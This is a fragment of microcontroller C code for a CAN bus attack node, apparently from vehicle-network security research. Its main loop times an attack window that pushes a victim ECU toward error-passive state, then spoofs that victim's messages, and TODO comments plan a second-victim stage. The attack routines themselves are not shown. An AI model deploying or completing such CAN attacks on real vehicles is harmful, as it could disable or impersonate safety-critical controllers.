    {
        if( g_tick == true ) {
            g_tick = false;

            count++;

            if ( count % 200 == 0 ) {
                if ( g_epass == true ) {
                    GPIOPinWrite(GPIO_PORTF_BASE, GPIO_PIN_4, 0);
                    g_epass = false;
                }
                g_sync = 1;
            }

            /* attack! */
            if ( count < ATK1_START ) {
                send_messages(count);
            } else if ( count >= ATK1_START && count <= ATK1_END ) {
                attack_messages_1(count, g_parity);

        #if GENERATE_PRECEDED_MSG
                CANMessageSet(CAN0_BASE, TXHIGHOBJECT, &g_sCAN0TxMessageHigh,
                              MSG_OBJ_TYPE_TX); /* Preceded Msg */
        #endif
                // CANMessageSet(CAN0_BASE, TXATKOBJECTHIGH, &g_sCAN0TxMessageAttackMid2, MSG_OBJ_TYPE_TX);

                // Step 1: Compromise Victim 1

                // TODO: read own TEC to detect when victim should be in passive state, when attacker has recovered enough for step 2

                // TODO: Step 2: begin spoofing victim 1, Reprogram RXOBJECT to sync with second victim, and attack it.
            } else {
                send_messages(count);
                spoof_messages_1(count);
            }
        }

        //
        // If the flag is set, that means that the RX interrupt occurred and
        // there is a message ready to be read from the CAN
        //
        if(g_bRXFlag)
        {
            //
            // Reuse the same message object that was used earlier to configure
            // the CAN for receiving messages.  A buffer for storing the
            // received data must also be provided, so set the buffer pointer
            // within the message object.
            //
            g_sCAN0RxMessage.pui8MsgData = (uint8_t *) &g_ui8RXMsgData;

            //
            // Read the message from the CAN.  Message object RXOBJECT is used
            // (which is not the same thing as CAN ID).  The interrupt clearing
            // flag is not set because this interrupt was already cleared in
            // the interrupt handler.
            //
            CANMessageGet(CAN0_BASE, RXOBJECT, &g_sCAN0RxMessage, 0);

            //
            // Clear the pending message flag so that the interrupt handler can
            // set it again when the next message arrives.
            //
            g_bRXFlag = 0;

            //
            // Check to see if there is an indication that some messages were
            // lost.
            //
            if(g_sCAN0RxMessage.ui32Flags & MSG_OBJ_DATA_LOST)
            {
            //    UARTprintf("\nCAN message loss detected\n");
            }

            //
            // Print the received character to the UART terminal
            //
//            UARTprintf("%c", g_ui8RXMsgData);

        }
        if (g_ui32ErrFlag) {
            CANErrorHandler();
        }

    }
}
